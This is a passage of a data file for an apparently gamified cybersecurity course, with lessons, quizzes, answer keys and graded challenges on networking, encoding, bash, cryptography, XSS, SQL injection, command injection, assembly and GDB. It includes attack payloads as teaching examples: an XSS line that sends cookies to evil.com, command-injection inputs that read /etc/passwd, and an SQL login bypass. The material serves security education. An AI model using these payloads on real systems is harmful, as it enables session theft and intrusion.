          evaluator: { type: 'text', config: { minWords: 90, targetWords: 160, keyConcepts: ['permission', 'setuid', 'risk', 'access', 'secure'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      {
        slug: 'basic-networking', title: 'Basic Networking Concepts', estMin: 30, difficulty: 1,
        lesson: {
          tldr: 'Networks enable communication but also create attack surfaces — understanding them is fundamental to security.',
          sections: [
            { h: 'IP addresses and ports', body: 'IPv4 (192.168.1.1) and IPv6 addresses identify machines. Ports (0-65535) identify services: 80=HTTP, 443=HTTPS, 22=SSH. Private IPs (192.168.x.x, 10.x.x.x) aren\'t routable on internet.' },
            { h: 'Protocols: TCP vs UDP', body: 'TCP is reliable (three-way handshake, guarantees delivery). UDP is fast but unreliable (no guarantees). ICMP for diagnostics (ping). Each has different security implications.' },
            { h: 'DNS and domains', body: 'DNS converts names (google.com) to IPs (142.250.185.46). DNS cache poisoning can redirect traffic. Always verify certificates for secure connections.' },
          ],
          example: { lang: 'bash', code: '# Test connectivity\nping 8.8.8.8\nping google.com\n\n# Check open ports\nnetstat -tulpn\nss -tulpn\n\n# Make HTTP request\ncurl https://example.com\n\n# Connect to a port\nnc example.com 80' },
          ask: 'What\'s the difference between 127.0.0.1 and your public IP?',
          keyPoints: ['Every network service is a potential vulnerability', 'Localhost (127.0.0.1) is your own machine', 'Private IPs aren\'t directly accessible from internet', 'Port scanning reveals running services'],
          misconception: '"HTTPS means the site is safe." It only means the connection is encrypted, not that the site is trustworthy.',
        },
        practice: [
          { q: 'What does port 443 typically indicate?', choices: ['HTTP', 'HTTPS', 'SSH', 'FTP'], answerIdx: 1, hint: 'Secure web traffic.', why: 'Port 443 is the standard for HTTPS (encrypted web traffic).' },
          { q: 'Can you access 192.168.1.1 from the internet?', choices: ['Yes, always', 'No, it\'s a private IP', 'Only with VPN', 'Only if port forwarding is set'], answerIdx: 1, hint: 'Private address space.', why: '192.168.x.x addresses are private and not routed on the public internet.' },
        ],
        quiz: [
          { q: 'What identifies a specific service on a computer?', choices: ['IP address', 'Port number', 'MAC address', 'Hostname'], answerIdx: 1, why: 'Port numbers (0-65535) identify specific services running on a machine.' },
          { q: 'Which protocol guarantees packet delivery?', choices: ['UDP', 'TCP', 'ICMP', 'IP'], answerIdx: 1, why: 'TCP (Transmission Control Protocol) guarantees delivery with acknowledgments.' },
          { q: 'DNS translates…', choices: ['IP to MAC', 'Names to IPs', 'Ports to services', 'Files to data'], answerIdx: 1, why: 'DNS (Domain Name System) converts domain names to IP addresses.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Network reconnaissance', timeMin: 30,
          brief: 'Explain how to identify: live hosts on a network, open ports on a target, the service running on a specific port, and how to determine if a website uses HTTPS. Include command examples.',
          requirements: ['host discovery method', 'port scanning technique', 'service identification', 'HTTPS detection', 'command examples'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'text', config: { minWords: 100, targetWords: 160, keyConcepts: ['port', 'scan', 'network', 'service', 'https', 'host'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      {
        slug: 'intro-encoding', title: 'Introduction to Encoding', estMin: 25, difficulty: 1,
        lesson: {
          tldr: 'Encoding transforms data format; encryption protects data securely. Know the difference.',
          sections: [
            { h: 'ASCII and character encoding', body: 'ASCII maps characters to numbers: A=65, a=97, space=32. Text is just numbers. Understanding this helps decode obfuscated data.' },
            { h: 'Base64 and hexadecimal', body: 'Base64 encodes binary as text (A-Z, a-z, 0-9, +, /). Hex uses 0-9 and A-F. Both are reversible without keys — not encryption!' },
            { h: 'URL and HTML encoding', body: 'URL encoding: space=%20, !=% 21. HTML entities: <&lt; >&gt;. Used to safely transmit special characters.' },
          ],
          example: { lang: 'bash', code: '# Base64\necho "Hello" | base64  # SGVsbG8K\necho "SGVsbG8K" | base64 -d  # Hello\n\n# Hex\necho "Hello" | xxd  # Hex dump\necho "48656c6c6f" | xxd -r -p  # Decode hex\n\n# URL encoding in URLs\n# "hello world" becomes "hello%20world"' },
          ask: 'If you see "SGVsbG8gV29ybGQ=", what encoding is this likely using?',
          keyPoints: ['Encoding transforms format, not security', 'Base64 ends with = padding', 'Hex uses 0-9 and A-F only', 'URL encoding uses % followed by hex'],
          misconception: '"Base64 is encryption." It\'s just encoding — easily reversed without any key.',
        },
        practice: [
          { q: 'What character does %20 represent in URL encoding?', choices: ['Newline', 'Space', 'Tab', 'Exclamation'], answerIdx: 1, hint: 'Most common in URLs.', why: '%20 is the URL-encoded space character.' },
          { q: 'Can you decode Base64 without a password?', choices: ['No, need key', 'Yes, it\'s just encoding', 'Only with special tools', 'Depends on version'], answerIdx: 1, hint: 'Encoding vs encryption.', why: 'Base64 is encoding, not encryption — anyone can decode it.' },
        ],
        quiz: [
          { q: 'What\'s the key difference between encoding and encryption?', choices: ['Speed', 'Encoding needs no key, encryption does', 'File size', 'Color'], answerIdx: 1, why: 'Encoding is reversible without a key; encryption requires a secret key.' },
          { q: 'Base64 typically ends with…', choices: ['!', '=', '#', '*'], answerIdx: 1, why: 'Base64 uses = for padding to make length a multiple of 4.' },
          { q: 'Which encoding uses only 0-9 and A-F?', choices: ['Base64', 'ASCII', 'Hexadecimal', 'Binary'], answerIdx: 2, why: 'Hexadecimal (hex) uses 16 symbols: 0-9 and A-F.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Multi-layer decoding', timeMin: 25,
          brief: 'Decode this multi-layered encoded message: "NTY3NDg2NTIwNzExNzU2OTYzNmI=". First layer is Base64, second is hex. Explain your process and show the decoded result.',
          requirements: ['identify Base64', 'decode Base64', 'identify hex', 'decode hex', 'show final result'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'text', config: { minWords: 80, targetWords: 140, keyConcepts: ['base64', 'hex', 'decode', 'layer', 'encode'], keyConceptRatio: 0.5, headings: 0 } },
        },
      },
      {
        slug: 'bash-scripting-security', title: 'Basic Bash Scripting', estMin: 35, difficulty: 1,
        lesson: {
          tldr: 'Automation multiplies your effectiveness — scripts let you test hundreds of targets in seconds.',
          sections: [
            { h: 'Variables and loops', body: 'Variables store data. Loops repeat actions. Combined, they automate repetitive security tasks like testing multiple IPs or passwords.' },
            { h: 'File processing', body: 'Read files line-by-line, extract data with grep/awk/sed, process results. Essential for log analysis and bulk operations.' },
            { h: 'Command substitution', body: '$(command) captures output as a variable. Backticks `` also work but $() is clearer. Build complex automation pipelines.' },
          ],
          example: { lang: 'bash', code: '#!/bin/bash\n# Port scanner\nfor port in {1..1024}; do\n  timeout 1 bash -c "echo >/dev/tcp/192.168.1.1/$port" 2>/dev/null && \\\n    echo "Port $port is open"\ndone\n\n# Find suspicious files\nfind /tmp -perm 777 -type f 2>/dev/null\n\n# Process log file\ngrep "Failed password" /var/log/auth.log | \\\n  awk \'{print $11}\' | sort | uniq -c | sort -nr' },
          ask: 'How would you test if a website responds to 100 different URLs?',
          keyPoints: ['for loops iterate over lists', 'Redirect errors with 2>/dev/null', 'Pipes | chain commands', 'Always test scripts in safe environments'],
          misconception: '"Scripts need to be complex." Simple scripts solve most problems — start basic and iterate.',
        },
        practice: [
          { q: 'What does 2>/dev/null do?', choices: ['Delete errors', 'Redirect errors to nowhere', 'Create null file', 'Nothing'], answerIdx: 1, hint: 'Error stream.', why: '2> redirects stderr (errors) to /dev/null (discards them).' },
          { q: 'How do you loop through 1 to 100 in bash?', choices: ['loop 1 100', 'for i in {1..100}', 'while 100', 'count(100)'], answerIdx: 1, hint: 'Brace expansion.', why: '{1..100} expands to all numbers from 1 to 100.' },
        ],
        quiz: [
          { q: 'What makes scripts useful for security?', choices: ['They\'re colorful', 'Automate repetitive tasks', 'They crash less', 'They\'re secret'], answerIdx: 1, why: 'Scripts automate repetitive tasks like scanning multiple targets or processing logs.' },
          { q: 'What does a for loop do?', choices: ['Loops forever', 'Iterates over a list', 'Breaks code', 'Calculates math'], answerIdx: 1, why: 'For loops iterate over each item in a list or range.' },
          { q: 'Where does 2>/dev/null send errors?', choices: ['To a file', 'To screen', 'Nowhere (discards them)', 'To email'], answerIdx: 2, why: '/dev/null is a black hole — data sent there disappears.' },
        ],
        challenge: {
          type: 'bash', kind: 'checkpoint', title: 'Write security automation scripts', timeMin: 35,
          brief: 'Write three bash one-liners: 1) Find all world-writable files in /tmp, 2) Check if ports 80, 443, 22 are open on localhost, 3) Extract all email addresses from a file.',
          requirements: ['find with permissions filter', 'nc or similar for port check', 'grep with regex for emails', 'proper syntax', 'works correctly'],
          passScore: 70, rewardNim: 3, xp: 120,
          evaluator: { type: 'bash', config: { requiredCommands: ['find', 'grep'], syntaxCheck: true } },
        },
      },
      {
        slug: 'crypto-basics', title: 'Cryptography Basics', estMin: 35, difficulty: 1,
        lesson: {
          tldr: 'Encryption protects confidentiality; hashing verifies integrity. They serve different purposes.',
          sections: [
            { h: 'Encryption vs hashing', body: 'Encryption is reversible with a key (AES, RSA). Hashing is one-way (SHA256, MD5). Use encryption for secrecy, hashing for verification.' },
            { h: 'Symmetric vs asymmetric', body: 'Symmetric uses same key (fast, like AES). Asymmetric uses public/private keys (slower, like RSA). HTTPS uses both: RSA to exchange keys, AES to encrypt data.' },
            { h: 'Salt and password security', body: 'Never store plain passwords. Hash them with salt (random data added before hashing). Salt prevents rainbow table attacks. Use bcrypt/scrypt, not MD5.' },
          ],
          example: { lang: 'bash', code: '# Hashing (one-way)\necho "password" | sha256sum\necho "password" | md5sum  # Broken, don\'t use!\n\n# Symmetric encryption with openssl\necho "secret" | openssl enc -aes-256-cbc -base64\n\n# Generate RSA keys\nopenssl genrsa -out private.pem 2048\nopenssl rsa -in private.pem -pubout -out public.pem' },
          ask: 'Why can\'t you decrypt a SHA256 hash?',
          keyPoints: ['Hashing is one-way, encryption is two-way', 'Salt makes rainbow tables useless', 'HTTPS uses both symmetric and asymmetric', 'Never invent your own crypto'],
          misconception: '"MD5 is fine for passwords." MD5 is broken — use bcrypt or scrypt instead.',
        },
        practice: [
          { q: 'Can you decrypt a SHA256 hash?', choices: ['Yes, with key', 'No, it\'s one-way', 'Only with rainbow table', 'Yes, with salt'], answerIdx: 1, hint: 'Hashing vs encryption.', why: 'SHA256 is a hash function — one-way and irreversible.' },
          { q: 'What does salting a password do?', choices: ['Encrypts it', 'Adds random data before hashing', 'Makes it longer', 'Nothing useful'], answerIdx: 1, hint: 'Prevents precomputed attacks.', why: 'Salt adds random data so same passwords hash differently.' },
        ],
        quiz: [
          { q: 'Can you reverse a hash back to the original?', choices: ['Yes, easily', 'No, it\'s one-way', 'Only with password', 'Only for MD5'], answerIdx: 1, why: 'Hash functions are one-way — you cannot reverse them to get the original data.' },
          { q: 'What\'s the main difference between symmetric and asymmetric encryption?', choices: ['Speed only', 'Symmetric uses same key, asymmetric uses key pairs', 'File size', 'Nothing'], answerIdx: 1, why: 'Symmetric uses one key for both operations; asymmetric uses public/private key pairs.' },
          { q: 'Why salt passwords before hashing?', choices: ['Makes them taste better', 'Prevents rainbow table attacks', 'Speeds up hashing', 'Encrypts them'], answerIdx: 1, why: 'Salt adds randomness so identical passwords hash differently, defeating rainbow tables.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Cryptographic analysis', timeMin: 35,
          brief: 'Explain: Why is storing passwords as MD5 hashes insecure? What is a rainbow table attack? How does salt prevent it? What should be used instead of MD5?',
          requirements: ['MD5 weakness explained', 'rainbow table concept', 'salt explanation', 'better alternatives mentioned', '120+ words'],
          passScore: 70, rewardNim: 3, xp: 120,
          evaluator: { type: 'text', config: { minWords: 110, targetWords: 170, keyConcepts: ['hash', 'salt', 'rainbow', 'md5', 'bcrypt', 'password'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      {
        slug: 'web-fundamentals', title: 'Web Fundamentals', estMin: 30, difficulty: 1,
        lesson: {
          tldr: 'Web apps are complex systems with many attack surfaces — understanding HTTP is the foundation.',
          sections: [
            { h: 'HTTP protocol', body: 'Request: method (GET/POST), path, headers, body. Response: status (200 OK, 404 Not Found), headers, body. State is maintained via cookies.' },
            { h: 'Client vs server', body: 'Client (browser) runs JavaScript, validates forms. Server processes requests, queries databases. Client-side validation isn\'t security — always validate server-side.' },
            { h: 'Cookies and sessions', body: 'Cookies store data in browser. Session cookies maintain login state. HttpOnly flag prevents JavaScript access. Secure flag requires HTTPS.' },
          ],
          example: { lang: 'bash', code: '# View HTTP request/response\ncurl -v https://example.com\n\n# POST data\ncurl -X POST https://example.com/login \\\n  -d "username=admin&password=test"\n\n# View headers only\ncurl -I https://example.com\n\n# Follow redirects\ncurl -L https://example.com' },
          ask: 'Where are cookies stored and who can access them?',
          keyPoints: ['HTTP is stateless — cookies maintain state', 'Client-side validation is bypassable', 'Never trust user input', 'HTTPS encrypts traffic but doesn\'t prevent app bugs'],
          misconception: '"JavaScript validation protects my form." Client code is fully controllable by attackers.',
        },
        practice: [
          { q: 'What\'s the difference between GET and POST?', choices: ['No difference', 'GET in URL, POST in body', 'POST is faster', 'GET is encrypted'], answerIdx: 1, hint: 'Data visibility.', why: 'GET parameters are in URL (visible in logs). POST data is in request body.' },
          { q: 'Can JavaScript validation prevent SQL injection?', choices: ['Yes, completely', 'No, only server-side can', 'Only in modern browsers', 'Yes, with HTTPS'], answerIdx: 1, hint: 'Client vs server.', why: 'Attackers bypass client-side JavaScript completely — only server validation matters.' },
        ],
        quiz: [
          { q: 'What maintains state in HTTP?', choices: ['Sessions', 'Cookies', 'Cache', 'DNS'], answerIdx: 1, why: 'Cookies store data in the browser to maintain state across requests.' },
          { q: 'Where is client-side validation enforced?', choices: ['Server', 'Browser', 'Database', 'Network'], answerIdx: 1, why: 'Client-side validation runs in the browser and is fully bypassable.' },
          { q: 'What does the HttpOnly flag prevent?', choices: ['HTTP access', 'JavaScript access to cookies', 'HTTPS use', 'Cookie creation'], answerIdx: 1, why: 'HttpOnly prevents JavaScript from reading cookies, mitigating XSS theft.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Web app reconnaissance', timeMin: 30,
          brief: 'Using curl or browser dev tools, analyze a website: identify HTTP methods used, find cookies and their flags, check security headers (X-Frame-Options, CSP), and identify the server software.',
          requirements: ['HTTP methods identified', 'cookies analyzed', 'security headers checked', 'server identified', 'tools/commands shown'],
          passScore: 70, rewardNim: 2, xp: 100,
          evaluator: { type: 'text', config: { minWords: 100, targetWords: 160, keyConcepts: ['http', 'cookie', 'header', 'curl', 'server', 'security'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      /* ══════ LEVEL 2: BEGINNER ══════ */
      {
        slug: 'xss-intro', title: 'Introduction to XSS', estMin: 35, difficulty: 2,
        lesson: {
          tldr: 'Cross-Site Scripting allows attackers to inject malicious JavaScript into pages viewed by others.',
          sections: [
            { h: 'What is XSS?', body: 'XSS happens when user input is echoed into HTML without sanitization. Attacker\'s script runs in victim\'s browser with victim\'s session cookies.' },
            { h: 'Types: Reflected vs Stored', body: 'Reflected XSS: payload in URL, requires victim to click. Stored XSS: payload saved in database, affects all users who view it. Stored is more dangerous.' },
            { h: 'Impact and prevention', body: 'XSS can steal cookies, redirect users, deface sites, or spread malware. Prevent by: encode output, validate input, use Content Security Policy.' },
          ],
          example: { lang: 'html', code: '<!-- Vulnerable code -->\n<p>Hello, <?php echo $_GET[\'name\']; ?>!</p>\n\n<!-- Attack -->\nhttp://site.com/?name=<script>alert(\'XSS\')</script>\n\n<!-- Result: script executes -->\n<p>Hello, <script>alert(\'XSS\')</script>!</p>\n\n<!-- Steal cookies -->\n<script>\nlocation=\'http://evil.com/?\'+document.cookie\n</script>' },
          ask: 'Why is stored XSS more dangerous than reflected XSS?',
          keyPoints: ['XSS executes in victim\'s context', 'Stored XSS persists and affects multiple users', 'Output encoding prevents XSS', 'CSP limits what scripts can execute'],
          misconception: '"Input validation prevents XSS." Output encoding is critical — validate input AND encode output.',
        },
        practice: [
          { q: 'Which is more dangerous?', choices: ['Reflected XSS', 'Stored XSS', 'Both equal', 'Neither is dangerous'], answerIdx: 1, hint: 'Persistence and reach.', why: 'Stored XSS persists in the database and affects all users automatically.' },
          { q: 'Can XSS work without <script> tags?', choices: ['No, needs <script>', 'Yes, via event handlers', 'Only in old browsers', 'No, XSS requires scripts'], answerIdx: 1, hint: 'Event attributes.', why: 'XSS works via <img onerror=>, <svg onload=>, etc.' },
        ],
        quiz: [
          { q: 'XSS stands for…', choices: ['eXtra Secure System', 'Cross-Site Scripting', 'XML Security Standard', 'eXternal Style Sheets'], answerIdx: 1, why: 'XSS = Cross-Site Scripting, injecting scripts into pages.' },
          { q: 'What context does XSS execute in?', choices: ['Server', 'Victim\'s browser', 'Database', 'Attacker\'s computer'], answerIdx: 1, why: 'XSS runs in the victim\'s browser with their session and cookies.' },
          { q: 'Content Security Policy (CSP) helps prevent…', choices: ['SQL injection', 'XSS', 'Buffer overflow', 'Phishing'], answerIdx: 1, why: 'CSP restricts where scripts can load from, limiting XSS impact.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'XSS vulnerability analysis', timeMin: 35,
          brief: 'Analyze this code: echo "<div>Welcome " . $_GET["user"] . "</div>"; Explain: Is it vulnerable to XSS? Provide an example attack payload. Show how to fix it properly.',
          requirements: ['vulnerability confirmed', 'attack payload provided', 'impact explained', 'proper fix shown', '100+ words'],
          passScore: 70, rewardNim: 3, xp: 130,
          evaluator: { type: 'text', config: { minWords: 90, targetWords: 150, keyConcepts: ['xss', 'script', 'sanitize', 'encode', 'payload', 'attack'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      {
        slug: 'sqli-basics', title: 'SQL Injection Basics', estMin: 40, difficulty: 2,
        lesson: {
          tldr: 'SQL injection manipulates database queries by injecting malicious SQL code through user input.',
          sections: [
            { h: 'How SQLi works', body: 'Applications build SQL queries with string concatenation. Attacker input breaks out of intended context and adds malicious SQL. Classic example: \' OR 1=1--' },
            { h: 'Types of SQLi', body: 'In-band (see results directly), Blind (infer from behavior), Error-based (trigger errors to leak info). Each requires different techniques.' },
            { h: 'Prevention', body: 'Use prepared statements (parameterized queries). Never build SQL with string concatenation. Principle: separate code from data.' },
          ],
          example: { lang: 'sql', code: '-- Vulnerable query\nSELECT * FROM users WHERE username=\'$user\' AND password=\'$pass\'\n\n-- Normal input\nusername: admin\npassword: secret123\n-- Result: SELECT * FROM users WHERE username=\'admin\' AND password=\'secret123\'\n\n-- Attack\nusername: admin\'--\npassword: anything\n-- Result: SELECT * FROM users WHERE username=\'admin\'--\' AND password=\'anything\'\n-- The -- comments out password check!' },
          ask: 'Why does \' OR 1=1-- bypass authentication?',
          keyPoints: ['SQLi exploits string concatenation', '\' breaks out of string context', '-- comments out rest of query', 'Prepared statements completely prevent SQLi'],
          misconception: '"Escaping quotes is enough." Prepared statements are the only reliable defense.',
        },
        practice: [
          { q: 'What does -- do in SQL?', choices: ['Division', 'Subtraction', 'Comment', 'Concatenation'], answerIdx: 2, hint: 'Ignores rest of line.', why: '-- starts a comment in SQL, making everything after it ignored.' },
          { q: 'Do prepared statements prevent SQLi?', choices: ['No', 'Only sometimes', 'Yes, completely', 'Only in MySQL'], answerIdx: 2, hint: 'Separation of code and data.', why: 'Prepared statements separate SQL code from data, making injection impossible.' },
        ],
        quiz: [
          { q: 'SQL injection exploits…', choices: ['Network protocols', 'String concatenation in queries', 'File permissions', 'CPU bugs'], answerIdx: 1, why: 'SQLi happens when user input is concatenated directly into SQL queries.' },
          { q: 'What do prepared statements do?', choices: ['Prepare server', 'Separate SQL code from data', 'Speed up queries', 'Format output'], answerIdx: 1, why: 'Prepared statements keep SQL code separate from user data, preventing injection.' },
          { q: 'What does UNION allow in SQLi?', choices: ['Delete data', 'Combine query results', 'Crash server', 'Encrypt data'], answerIdx: 1, why: 'UNION combines results from multiple SELECT queries, useful for data extraction.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'SQL injection exploitation', timeMin: 40,
          brief: 'Given: SELECT * FROM users WHERE id=$id; Explain: How to extract data from other tables using UNION. Show payload to get usernames from an \'admin\' table. Explain blind SQLi if results aren\'t visible.',
          requirements: ['UNION injection explained', 'payload crafted', 'blind SQLi concept', 'column count matching', '130+ words'],
          passScore: 70, rewardNim: 4, xp: 140,
          evaluator: { type: 'text', config: { minWords: 120, targetWords: 180, keyConcepts: ['sql', 'union', 'injection', 'query', 'blind', 'payload'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      {
        slug: 'command-injection', title: 'Command Injection', estMin: 30, difficulty: 2,
        lesson: {
          tldr: 'Command injection allows executing arbitrary system commands when user input is passed to shell functions.',
          sections: [
            { h: 'Vulnerable functions', body: 'system(), exec(), shell_exec() in PHP; os.system() in Python; child_process.exec() in Node. All dangerous when used with user input.' },
            { h: 'Command separators', body: '; runs second command regardless. && runs if first succeeds. || runs if first fails. | pipes output. $(command) and `command` for substitution.' },
            { h: 'Prevention', body: 'Avoid shell commands entirely. Use libraries/APIs instead. If unavoidable: whitelist input, escape properly, use parameterized commands.' },
          ],
          example: { lang: 'php', code: '<?php\n// Vulnerable\n$ip = $_GET[\'ip\'];\nsystem("ping -c 4 " . $ip);\n\n// Normal: ?ip=8.8.8.8\n// Attack: ?ip=8.8.8.8;cat /etc/passwd\n// Executes: ping -c 4 8.8.8.8;cat /etc/passwd\n\n// Also works:\n// ?ip=8.8.8.8 && whoami\n// ?ip=$(whoami)\n?>' },
          ask: 'What does && do between two commands?',
          keyPoints: ['Never pass user input to system commands', 'Many separators: ; && || |', 'Command substitution: $() and backticks', 'Use APIs and libraries, not shell commands'],
          misconception: '"Whitelisting input is enough." If you must use shell commands, also use safe execution methods.',
        },
        practice: [
          { q: 'Which separator runs the second command only if the first succeeds?', choices: [';', '&&', '||', '|'], answerIdx: 1, hint: 'Conditional execution.', why: '&& (AND) only runs second command if first exits with 0 (success).' },
          { q: 'What does | do between commands?', choices: ['Runs both', 'Pipes output', 'Comments out', 'Separates'], answerIdx: 1, hint: 'Data flow.', why: '| pipes stdout of first command to stdin of second command.' },
        ],
        quiz: [
          { q: 'Command injection exploits…', choices: ['Database queries', 'System command execution', 'HTML rendering', 'CSS styles'], answerIdx: 1, why: 'Command injection executes operating system commands through vulnerable applications.' },
          { q: 'Which function is vulnerable in PHP?', choices: ['echo', 'system()', 'strlen()', 'isset()'], answerIdx: 1, why: 'system() and similar functions execute shell commands with user input.' },
          { q: 'What\'s the safest approach?', choices: ['Use system() with validation', 'Avoid shell commands entirely', 'Only use root', 'Filter semicolons'], answerIdx: 1, why: 'Best practice is to avoid shell commands and use library/API alternatives.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Command injection exploit', timeMin: 30,
          brief: 'Application runs: system("nslookup " . $_GET[\'host\']); Show 3 different attack payloads using different separators. Explain what each does. Propose a secure alternative.',
          requirements: ['3 different separators used', 'each payload explained', 'impact described', 'secure alternative', '100+ words'],
          passScore: 70, rewardNim: 3, xp: 120,
          evaluator: { type: 'text', config: { minWords: 90, targetWords: 150, keyConcepts: ['command', 'injection', 'separator', 'system', 'payload', 'secure'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      {
        slug: 'assembly-basics', title: 'Assembly Basics', estMin: 40, difficulty: 2,
        lesson: {
          tldr: 'Assembly is human-readable machine code — essential for reverse engineering and exploitation.',
          sections: [
            { h: 'Registers', body: 'CPU storage: rax (return values), rbx-rdx (general), rsi/rdi (function args), rsp (stack pointer), rbp (base pointer), rip (instruction pointer).' },
            { h: 'Instructions', body: 'mov (copy data), add/sub (arithmetic), cmp (compare), jmp/je/jne (control flow), call/ret (functions), push/pop (stack operations).' },
            { h: 'Stack and calling conventions', body: 'Stack grows downward. Function calls push return address. Arguments in registers (Linux: rdi, rsi, rdx) or stack. Understanding this enables exploitation.' },
          ],
          example: { lang: 'nasm', code: '; Simple function\nmov rax, 5      ; rax = 5\nmov rbx, 10     ; rbx = 10\nadd rax, rbx    ; rax = 15\nret             ; return\n\n; Conditional\ncmp rax, 0      ; compare rax to 0\nje label        ; jump if equal\n; ... not equal code ...\nlabel:\n; ... equal code ...' },
          ask: 'What register holds the return value in x86-64?',
          keyPoints: ['Registers are fast CPU storage', 'rip points to next instruction', 'Stack stores local variables and return addresses', 'Understanding assembly enables binary exploitation'],
          misconception: '"Assembly is impossibly hard." Small instruction set, repetitive patterns — readable with practice.',
        },
        practice: [
          { q: 'What does rip register contain?', choices: ['Stack pointer', 'Base pointer', 'Instruction pointer', 'Return value'], answerIdx: 2, hint: 'Next instruction.', why: 'rip (instruction pointer) holds address of next instruction to execute.' },
          { q: 'Which register typically holds function return values?', choices: ['rbx', 'rcx', 'rax', 'rsp'], answerIdx: 2, hint: 'Accumulator register.', why: 'rax (accumulator) conventionally holds return values.' },
        ],
        quiz: [
          { q: 'Assembly is…', choices: ['A programming language', 'Human-readable machine code', 'A compiler', 'An operating system'], answerIdx: 1, why: 'Assembly is the human-readable representation of machine code instructions.' },
          { q: 'Which register typically holds function arguments in x86-64?', choices: ['rax', 'rdi, rsi, rdx', 'rip', 'rsp'], answerIdx: 1, why: 'In x86-64 Linux, first three arguments go in rdi, rsi, rdx registers.' },
          { q: 'What does the stack store?', choices: ['Programs', 'Local variables and return addresses', 'Global variables only', 'Assembly code'], answerIdx: 1, why: 'Stack stores local variables, return addresses, and saved registers.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Read assembly code', timeMin: 40,
          brief: 'Analyze this assembly: mov rax, 10; mov rbx, 20; cmp rax, rbx; jl less; mov rax, rbx; jmp done; less: ; done: ret; Explain what it does and what value rax has after execution.',
          requirements: ['line-by-line explanation', 'conditional logic explained', 'final rax value', 'control flow described', '100+ words'],
          passScore: 70, rewardNim: 4, xp: 140,
          evaluator: { type: 'text', config: { minWords: 90, targetWords: 150, keyConcepts: ['register', 'cmp', 'jump', 'rax', 'assembly', 'mov'], keyConceptRatio: 0.5, headings: 0 } },
        },
      },
      {
        slug: 'using-gdb', title: 'Using GDB Debugger', estMin: 35, difficulty: 2,
        lesson: {
          tldr: 'GDB lets you inspect program state at any point — essential for reverse engineering and exploitation.',
          sections: [
            { h: 'Basic commands', body: 'run (start), break (set breakpoint), continue, step/stepi (step through), next/nexti (step over), print (examine variables), x (examine memory).' },
            { h: 'Examining state', body: 'info registers (show all registers), x/10x $rsp (hex dump of stack), x/s $rdi (string at rdi), disassemble (show assembly), backtrace (call stack).' },
            { h: 'Modifying execution', body: 'set $rax=0 (change register), jump *address (change rip), call function() (invoke function). You can bypass checks and test exploits.' },
          ],
          example: { lang: 'bash', code: '# Start debugging\ngdb ./program\n\n# Set breakpoint and run\n(gdb) break main\n(gdb) run arg1 arg2\n\n# Examine\n(gdb) info registers\n(gdb) x/20x $rsp       # Stack dump\n(gdb) x/s 0x400000     # String at address\n\n# Step through\n(gdb) stepi             # One instruction\n(gdb) continue          # Until next breakpoint' },
          ask: 'How do you view the value at a memory address in gdb?',
          keyPoints: ['Breakpoints pause execution at specific locations', 'x command examines memory', 'You can modify registers and memory while debugging', 'Essential tool for understanding binaries'],
          misconception: '"Debugging is only for fixing bugs." It\'s also critical for understanding programs and developing exploits.',
        },
        practice: [
          { q: 'What command sets a breakpoint in gdb?', choices: ['stop', 'pause', 'break', 'breakpoint'], answerIdx: 2, hint: 'Short and common.', why: 'break (or b) sets breakpoints at functions or addresses.' },
          { q: 'What does stepi do?', choices: ['Step into function', 'Step one instruction', 'Step over function', 'Stop immediately'], answerIdx: 1, hint: 'Instruction-level.', why: 'stepi executes exactly one assembly instruction.' },
        ],
        quiz: [
          { q: 'GDB is…', choices: ['A compiler', 'A debugger', 'An editor', 'A web browser'], answerIdx: 1, why: 'GDB (GNU Debugger) is a tool for debugging programs.' },
          { q: 'What does a breakpoint do?', choices: ['Breaks the program', 'Pauses execution at a location', 'Fixes bugs', 'Compiles code'], answerIdx: 1, why: 'Breakpoints pause program execution so you can inspect state.' },
          { q: 'Can GDB modify program state during execution?', choices: ['No, read-only', 'Yes, registers and memory', 'Only with source code', 'Only on Windows'], answerIdx: 1, why: 'GDB can modify registers, memory, and even skip instructions during debugging.' },
        ],
        challenge: {
          type: 'explain', kind: 'checkpoint', title: 'Debug a program', timeMin: 35,
          brief: 'Explain how to use gdb to: set a breakpoint at main, run the program, examine the value of rax, view 10 words of the stack, and change rax to 0. Provide exact gdb commands.',
          requirements: ['breakpoint command', 'run command', 'examine register', 'stack dump command', 'modify register command'],
          passScore: 70, rewardNim: 3, xp: 130,
          evaluator: { type: 'text', config: { minWords: 80, targetWords: 140, keyConcepts: ['gdb', 'break', 'register', 'stack', 'examine', 'command'], keyConceptRatio: 0.5, headings: 1 } },
        },
      },
      {
        slug: 'basic-reversing', title: 'Basic Reverse Engineering', estMin: 40, difficulty: 2,
        lesson: {
          tldr: 'Reverse engineering reconstructs program logic from compiled code — the foundation of vulnerability research.',
          sections: [
            { h: 'Static analysis tools', body: 'file (identify format), strings (extract printable text), objdump (disassemble), Ghidra/IDA (decompilers). Start simple before complex tools.' },
            { h: 'Dynamic analysis', body: 'strace (system calls), ltrace (library calls), gdb (step-through debugging). See what the program actually does at runtime.' },
            { h: 'Finding interesting code', body: 'Look for error messages, function names, hardcoded strings. Follow execution flow. Identify key decision points (if statements, loops).' },
          ],
          example: { lang: 'bash', code: '# Basic reconnaissance\nfile ./program\nstrings ./program | grep -i "password"\n\n# Disassemble\nobjdump -d ./program | less\n\n# System calls\nstrace ./program 2>&1 | grep open\n\n# Library calls\nltrace ./program' },
          ask: 'What\'s the first thing you should run on an unknown binary?',
          keyPoints: ['Start with strings to find obvious clues', 'Static analysis before dynamic', 'Function names reveal purpose', 'Focus on key decision points, not every instruction'],
          misconception: '"Need to understand every instruction." Focus on logic flow and key checks.',
        },
